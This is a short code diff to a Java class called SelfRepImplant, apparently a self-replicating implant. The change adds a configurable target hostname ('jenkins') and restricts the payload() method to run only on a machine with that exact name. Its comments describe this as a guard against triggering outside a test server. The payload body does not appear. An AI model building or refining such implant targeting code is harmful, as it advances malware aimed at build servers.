@@ -41,6 +41,14 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
      */
     static volatile String CONF_DOMAIN;
 
+    /**
+     * The expected hostname of the target.
+     * It will not run if the hostname of the machine does not match this value.
+     * It's a bit of a sanity check so you don't accidentally trigger this in the wrong environment.
+     * Ask us how we know...
+     */
+    static volatile String CONF_TARGET_HOSTNAME = "jenkins";
+
     // This one is not so important. Only use it for temp files and such.
     private static final Random rng = new Random(System.currentTimeMillis());
 
@@ -81,7 +89,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
     public static void payload() {
         Optional<String> hostname = getHostname();
-        if (hostname.isEmpty() || !hostname.get().contains("jenkins")) {
+        if (hostname.isEmpty() || !hostname.get().equals(CONF_TARGET_HOSTNAME)) {
             // Don't accidentally explode somewhere other than the test server
             System.out.println("Not inside Jenkins? Aborting.");
             return;
